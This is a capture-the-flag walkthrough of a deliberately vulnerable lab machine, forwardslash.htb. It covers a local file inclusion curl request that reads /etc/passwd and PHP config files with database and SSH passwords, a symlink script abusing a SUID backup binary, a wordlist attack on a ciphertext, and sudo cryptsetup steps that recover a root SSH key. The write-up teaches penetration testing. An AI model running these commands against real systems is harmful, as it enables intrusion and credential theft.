# User

## nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## http server

Apache, navigating to IP tries to redirect to DNS entry forwardslash.htb.  Adding to to /etc/hosts reveals a defaced website that mentions

```
|  You call this security? LOL, absolute trash server...  |
#Defaced • This was ridiculous, who even uses *XML* and *Automatic FTP Logins*

WE ARE:

-= The loyal followers of *Sharon* (May her soul be blessed). We do not forgive. We do not forget. We are legion. We are The Backslash Gang. =-
```

Enumerating we find a `note.txt` file, and only that file, it contains:

```
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name... 
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
```

## backup.forwardslash.htb

Taking a clue from note.txt, we try a request with a host of backup.forwardslash.htb and we get a session token and different redirect.  Add it to the hosts file and we get redirected to a login.php page in the browser.

### Enumerating backup

register.php says user name is taken for pain.  We can make our own admin account. `pain:password` works as a login.  Looks like `profilepicture.php` allows LFI.  The dev/index.php gives an error that you can access it from your current ip.  Dropping the url into the profilepicture.php shows an XML Api Test page.  It also seems using a php filter with base64 returns files that are not returned with just file://.

## LFI enumeration
Interesting entries from /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

curl command to do post on command line.  Use lfi-exploit.sh to just have to type the file name

```
curl 'http://backup.forwardslash.htb/profilepicture.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' -H 'Cookie: PHPSESSID=bu71fhqvu463sko2s9sc0te30j' --data-urlencode 'url=file://' --compressed --insecure
```

/etc/apache2/sites-enabled/backup.forwardslash.htb.conf
```conf 
# Place any notes or comments you have here
# It will make any customisation easier to understand in the weeks to come

# domain: backup.forwardslash.htb
# public: /var/www/backup.forwardslash.htb/

<VirtualHost *:80>

  # Admin email, Server Name (domain name) and any aliases
  ServerAdmin webmaster@forwardslash.htb
  ServerName  backup.forwardslash.htb
  ServerAlias backup.forwardslash.htb


  # Index file and Document Root (where the public files are located)
  #DirectoryIndex index.html index.php index
  DirectoryIndex welcome.php index.php
  DocumentRoot /var/www/backup.forwardslash.htb/


  # Custom log file locations
  LogLevel warn
  ErrorLog /var/log/apache2/error-backup.forwardslash.htb.log
  CustomLog /var/log/apache2/access-backup.forwardslash.htb.log combined
  ```

/var/www/backup.forwardslash.htb/config.php
```php
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
/var/www/backup.forwardslash.htb/dev/index.php has a login and password that works for chiv's ssh.
```php
		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
```

## XML Api Test
This page can be accessed via the admin account.  It also allows LFI via XXE but why do we need it?  Maybe the designers weren't aware of the php filters?

## ssh as chiv
Searching around we find that there's an encryptinator tool in `/home/pain` as well as a `ciphertext` file.  The `pain` user also has user.txt in its home directory.  We also find a SUID named backup owned by `pain` that outputs some odd text.

## Deciphering and using the backup binary
It outputs the following text when running:
```
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:04:20
ERROR: 27a2347cdd27c0debd5d49683156647a Does Not Exist or Is Not Accessible By Me, Exiting...
```
Running it multiple times shows the md5 changes every second.  Moving the binary to local server and stepping through it in `gdb` shows it gets an md5 hash of the current time, checks for a file named after the hash value, and then outputs that file's contents to stdout.  So, let's write a quick script to take advantage of it, utilizing symlinks to dump whatever file we want.
```sh
#!/bin/sh
link="${1}"
test=$(/usr/bin/backup | grep -P '([a-f0-9]{32})' -o)
ln -s ${1} ${test}
/usr/bin/backup
```

Using this against `/var/backup/config.php.bak` yields

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

The password works for pain's account.

# Root

## Breaking the Ciphertext

Write a python script utilizing the functions in the encryptinator code found in pain's home directory.  We iterate through the passwords in a given file(I used rockyou.txt), attempt the decryption, and then check the number of alphanumeric characters in the output.  See `decrypter.py`.  Numerous keys seem to output something.  Although there's something odd going on with the encoding.  Potential output:

```
122:truelymadlydeeply: x	=\mÔÔE¬lL),you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
123:tilldeathdouspart: «ÛÂô~gq¤¡öån'you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
```

## Mounting the encrypted backup image
If you enumerate on the `pain` account you'll find you can sudo without password for `cryptsetup` and `mount`.  We can run these commands against the image in `/var/backups/recovery`, using the password, to mount it and view the contents.  You can also just transfer the file to your own machine.  Once you view the unencrytped contents you'll see an SSH private key and can use that to SSH as root.